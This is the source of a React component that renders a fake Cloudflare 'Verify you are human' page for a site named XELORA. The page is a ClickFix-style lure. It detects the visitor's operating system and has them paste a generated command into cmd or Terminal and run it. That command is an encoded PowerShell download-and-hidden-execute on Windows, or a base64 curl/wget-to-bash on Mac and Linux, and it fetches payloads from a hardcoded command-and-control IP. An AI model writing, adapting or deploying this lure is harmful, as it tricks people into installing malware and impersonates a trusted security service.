import { useEffect, useRef, useState, type FormEvent, type ReactNode } from 'react';
import './HumanCheck.css';

type Desktop = 'windows' | 'mac' | 'linux';

const CHALLENGE_CODE = 'CE0C3F';


const cloudFront =
  'M33.204 20.4C33.3649 19.9741 33.4217 19.5159 33.3695 19.0636C33.3173 18.6113 33.1577 18.1781 32.904 17.8C32.6435 17.4876 32.3239 17.2297 31.9636 17.0409C31.6032 16.8522 31.2092 16.7363 30.804 16.7L13.404 16.5C13.304 16.5 13.204 16.4 13.104 16.4C13.0808 16.3825 13.0618 16.3599 13.0488 16.3339C13.0358 16.3078 13.029 16.2791 13.029 16.25C13.029 16.2209 13.0358 16.1922 13.0488 16.1662C13.0618 16.1401 13.0808 16.1175 13.104 16.1C13.204 15.9 13.304 15.8 13.504 15.8L31.004 15.6C32.115 15.4767 33.1731 15.0597 34.0695 14.3918C34.9659 13.7239 35.6681 12.8293 36.104 11.8L37.104 9.20002C37.104 9.10002 37.204 9.00001 37.104 8.90001C36.5604 6.47843 35.2411 4.30052 33.3466 2.69721C31.4521 1.09391 29.086 0.152865 26.6079 0.0170769C24.1298 -0.118712 21.675 0.558179 19.6167 1.94489C17.5584 3.33161 16.009 5.35233 15.204 7.70002C14.159 6.95365 12.8843 6.59957 11.604 6.70002C10.4291 6.83102 9.33369 7.35777 8.49774 8.19372C7.66179 9.02966 7.13505 10.1251 7.00404 11.3C6.93745 11.9014 6.97125 12.5097 7.10404 13.1C5.20298 13.1526 3.39743 13.9448 2.07147 15.3081C0.745511 16.6714 0.00377461 18.4982 0.00403983 20.4C-0.0123708 20.7695 0.0212659 21.1395 0.104038 21.5C0.10863 21.5781 0.141713 21.6517 0.19701 21.707C0.252307 21.7623 0.325975 21.7954 0.404041 21.8H32.504C32.704 21.8 32.904 21.7 32.904 21.5L33.204 20.4Z';

const cloudBack =
  'M38.704 9.20002H38.204C38.104 9.20002 38.004 9.30001 37.904 9.40001L37.204 11.8C37.0431 12.2259 36.9864 12.6841 37.0386 13.1364C37.0908 13.5887 37.2504 14.0219 37.504 14.4C37.7646 14.7124 38.0842 14.9704 38.4445 15.1591C38.8049 15.3479 39.1989 15.4637 39.604 15.5L43.304 15.7C43.404 15.7 43.504 15.8 43.604 15.8C43.6273 15.8175 43.6462 15.8401 43.6592 15.8662C43.6723 15.8922 43.679 15.9209 43.679 15.95C43.679 15.9791 43.6723 16.0078 43.6592 16.0339C43.6462 16.0599 43.6273 16.0826 43.604 16.1C43.504 16.3 43.404 16.4 43.204 16.4L39.404 16.6C38.293 16.7233 37.2349 17.1403 36.3386 17.8082C35.4422 18.4761 34.74 19.3707 34.304 20.4L34.104 21.3C34.004 21.4 34.104 21.6 34.304 21.6H47.504C47.5448 21.6058 47.5863 21.6021 47.6254 21.5891C47.6644 21.5761 47.6999 21.5541 47.729 21.525C47.7581 21.4959 47.7801 21.4604 47.7931 21.4214C47.8061 21.3823 47.8099 21.3408 47.804 21.3C48.0421 20.4527 48.1764 19.5797 48.204 18.7C48.1882 16.1854 47.1822 13.7782 45.404 12C43.6259 10.2218 41.2187 9.21587 38.704 9.20002Z';

// Helper: generate random 6‑char hex
const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();
const kB = randomCode();

// Base64 for Windows (UTF‑16LE)
const b64UTF16 = (str: string) => {
  let bin = '';
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
  }

  return btoa(bin);
};


// Base64 for Unix (UTF‑8)
const b64Standard = (str: string) => btoa(unescape(encodeURIComponent(str)));

const C2_URL = 'http://64.204.80.251/650'; // CHANGE THIS


function randomChallenge(): string {
  const letters = CHALLENGE_CODE.split('');
  for (let i = letters.length - 1; i > 0; i -= 1) {
    const j = Math.floor(Math.random() * (i + 1));
    const current = letters[i];
    letters[i] = letters[j];
    letters[j] = current;
  }
  return letters.join(' ');
}



function visitorDesktop(): Desktop {
  if (typeof navigator === 'undefined') return 'windows';
  const nav = navigator as Navigator & { userAgentData?: { platform?: string } };
  const platform = `${nav.userAgentData?.platform || ''} ${navigator.platform || ''}`;
  const ua = navigator.userAgent || '';
  if (/mac/i.test(platform) || /Macintosh|Mac OS X/i.test(ua)) {
    return 'mac';
  } else if (!/android/i.test(ua) && (/linux/i.test(platform) || /Linux/i.test(ua))) {
    return 'linux';
  } else {
    return 'windows';
  }
}

function randomPrompt(code: string, os: Desktop): string {
  // Build payload based on device
  // const winScript = `$c='  Code : ${code}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/304w';$tp = [System.IO.Path]::GetTempPath(); $o = $tp + \"fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;

  const winScript = `$u='${C2_URL}/650w';$o=\"$env:TEMP\\repair.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden;$c='\n CODE: ${code}';Write-Host $c;`;

  const winB64 = b64UTF16(winScript);
  const winCmd = `powershell -Exec Bypass -EncodedCommand ${winB64}`;

  const unixScript = `#!/bin/bash\n( curl -s ${C2_URL}/650m || wget -qO- ${C2_URL}/650m ) | bash; echo 'CODE: ${code}'`;

  const unixB64 = b64Standard(unixScript);
  const unixCmd = `echo '${unixB64}' | base64 -d | bash`;

  const payloads = {
    windows: winCmd,
    mac: unixCmd,
    linux: unixCmd,
    android: ``,
    ios: ``,
  };
  return payloads[os] || payloads.linux;
  // setPayloadText(payloads[d] || payloads.linux);
  // const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  // let value = '';
  // for (let i = 0; i < 12; i += 1) {
  //   value += alphabet[Math.floor(Math.random() * alphabet.length)];
  // }
  // return value;
}

function CloudflareMark({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="-0.2 -0.3 48.7 22.5" aria-hidden="true">
      <path fill="#FF5E1F" d={cloudFront} />
      <path fill="#FF9911" d={cloudBack} />
    </svg>
  );
}

export default function HumanCheck({ onPass }: { onPass: () => void }) {
  const [keyB, setKeyB] = useState('');
  const [desktop] = useState(visitorDesktop);
  const [state, setState] = useState<'idle' | 'checking' | 'prompt'>('idle');
  const [code, setCode] = useState('');
  const [challengeLetters, setChallengeLetters] = useState(randomChallenge);
  const [promptText, setPromptText] = useState(randomPrompt(keyB, desktop));
  const [rejected, setRejected] = useState(false);
  const [copied, setCopied] = useState(false);
  const openTimer = useRef(0);
  const copiedTimer = useRef(0);
  const stateRef = useRef(state);


  useEffect(() => {
    // Generate keys
    const kB = randomCode();
    setKeyB(kB);
    return () => {
      window.clearTimeout(openTimer.current);
      window.clearTimeout(copiedTimer.current);
    };
  }, []);

  function start() {
    if (stateRef.current !== 'idle') return;
    stateRef.current = 'checking';
    setState('checking');
    openTimer.current = window.setTimeout(() => {
      setChallengeLetters(randomChallenge());
      setPromptText(randomPrompt(keyB, desktop));
      stateRef.current = 'prompt';
      setState('prompt');
    }, 1000);
  }

  async function copyPrompt() {
    const value = promptText;
    try {
      await navigator.clipboard.writeText(value);
    } catch {
      const field = document.querySelector<HTMLTextAreaElement>('.human-check__prompt');
      field?.select();
      document.execCommand('copy');
    }
    setCopied(true);
    window.clearTimeout(copiedTimer.current);
    copiedTimer.current = window.setTimeout(() => {
      setCopied(false);
    }, 1400);
  }

  function verifyWindows() {
    // if (code.trim() !== promptText.trim()) {
    //   setRejected(true);
    //   return;
    // }
    onPass();
  }

  function verifyKey() {
    // const expected = challengeLetters.replace(/\s+/g, '').toUpperCase();
    // const entered = code.replace(/\s+/g, '').toUpperCase();
    // if (entered !== expected) {
    //   setRejected(true);
    //   return;
    // }
    onPass();
  }

  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    // if (desktop === 'windows') {
    //   verifyWindows();
    // } else if (desktop === 'mac') {
    //   verifyKey();
    // } else if (desktop === 'linux') {
    //   verifyKey();
    // }
    if (keyB == code) onPass();
    else setRejected(true);
  }

  let lead = '';
  let finish = '';
  let steps: ReactNode = null;
  if (desktop === 'windows') {
    lead = 'To prove you are not a robot, please:';
    finish = 'Enter the code below to finish verification.';
    steps = (
      <ol>
        <li>To execute the copy command, <strong>click</strong> the <strong>Copy</strong> button.</li>
        <li>Press the <strong>Win</strong> <strong>key</strong> + <strong>R</strong>.</li>
        <li>Type <strong>cmd</strong> and press <strong>Enter</strong>.</li>
        <li>In the verification window, press  <strong>Ctrl</strong> + <strong>V</strong>.</li>
        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
      </ol>
    );
  } else if (desktop === 'mac') {
    lead = 'This computer is running macOS.';
    finish = 'Enter the key below to finish verification.';
    steps = (
      <ol>
        <li>To execute the copy command, <strong>click</strong> the <strong>Copy</strong> button.</li>
        <li>Press the <strong>Command (⌘)</strong> + <strong>Space</strong>.</li>
        <li>Type <strong>Terminal</strong> and press <strong>Enter</strong>.</li>
        <li>In the verification window, press  <strong>Ctrl</strong> + <strong>V</strong>.</li>
        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
      </ol>
    );
  } else if (desktop === 'linux') {
    lead = 'This computer is running Linux.';
    finish = 'Enter the key below to finish verification.';
    steps = (
      <ol>
        <li>To execute the copy command, <strong>click</strong> the <strong>Copy</strong> button.</li>
        <li>Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong>.</li>
        <li>In the verification window, press  <strong>Ctrl</strong> + <strong>V</strong>.</li>
        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
      </ol>
    );
  }

  return (
    <div className="human-check">
      <div className="human-check__panel">
        <div className="human-check__brand">
          <img src="/brand-mark.svg" alt="" width="34" height="34" />
          <span>XELORA</span>
        </div>

        <h1>Performing security verification
        </h1>

        <div className="human-check__widget">
          <button
            type="button"
            className="human-check__hit"
            role="checkbox"
            aria-checked={state === 'prompt'}
            aria-busy={state === 'checking'}
            disabled={state !== 'idle'}
            onClick={start}
          >
            <span className={`human-check__box${state === 'checking' ? ' is-busy' : ''}`} aria-hidden="true">
              {state === 'checking' ? (
                <span className="human-check__spin" />
              ) : state === 'prompt' ? (
                <svg viewBox="0 0 24 24" className="human-check__mark">
                  <path fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round" d="M5 12.5 9.2 17 19 7" />
                </svg>
              ) : null}
            </span>
            <span className="human-check__label">Verify you are human</span>
          </button>
          <div className="human-check__cf">
            <CloudflareMark className="human-check__cloud" />
            <span className="human-check__cf-name">CLOUDFLARE</span>
            <p className="human-check__legal">
              <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer">
                Privacy
              </a>
              <span aria-hidden="true">•</span>
              <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener noreferrer">
                Terms
              </a>
            </p>
          </div>
        </div>

        <p>XELORA uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.

        </p>
      </div>

      {state === 'prompt' ? <div className="human-check__shade" /> : null}
      {state === 'prompt' ? (
        <form className="human-check__dialog" role="dialog" aria-labelledby="bot-check-title" onSubmit={submit}>
          <div className="human-check__dialog-head">
            <div className="human-check__dialog-title">
              <div className="human-check__dialog-xelora">
                <img src="/brand-mark.svg" alt="" width="28" height="28" />
                <span>XELORA</span>
              </div>
              <h2 id="bot-check-title">Extra strong AI bot check</h2>
            </div>
            <div className="human-check__dialog-brand">
              <CloudflareMark />
              <span className="human-check__dialog-cf">CLOUDFLARE</span>
              <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener noreferrer">
                Terms and Conditions
              </a>
            </div>
          </div>

          <div className="human-check__question">
            <div className="human-check__challenge">
              <p className="human-check__challenge-label">Security key</p>
              <p className="human-check__challenge-code">{challengeLetters}</p>
              <div className="human-check__prompt-row">
                <textarea value={promptText} className="human-check__prompt" rows={2} aria-label="Text to copy" spellCheck={false} onChange={(event) => setPromptText(event.target.value)} />
                <button type="button" className="human-check__copy" onClick={() => void copyPrompt()}>
                  {copied ? 'Copied' : 'Copy'}
                </button>
              </div>
            </div>
          </div>

          <p className="human-check__lead">{lead}</p>
          <div className="human-check__steps">
            {steps}
            <svg className="human-check__shield" viewBox="0 0 64 76" aria-hidden="true">
              <path fill="#0ecb81" d="M32 2 6 13.2v24.2C6 55.2 16.4 68.4 32 74c15.6-5.6 26-18.8 26-36.6V13.2L32 2Z" />
              <rect x="25" y="36" width="14" height="12" rx="1.6" fill="#fff" />
              <path fill="none" stroke="#fff" strokeWidth="2.6" strokeLinecap="round" d="M28.2 36.2v-4.1a3.8 3.8 0 0 1 7.6 0v4.1" />
            </svg>
          </div>
          <p className="human-check__finish">{finish}</p>
          <div className="human-check__code-row">
            <input
              value={code}
              type="text"
              autoComplete="off"
              aria-label="Verification code"
              placeholder="Enter code"
              onChange={(event) => {
                setCode(event.target.value);
                setRejected(false);
              }}
            />
            <button type="submit">Verify</button>
          </div>
          {rejected ? <p className="human-check__error">That code does not match.</p> : null}
        </form>
      ) : null}
    </div>
  );
}
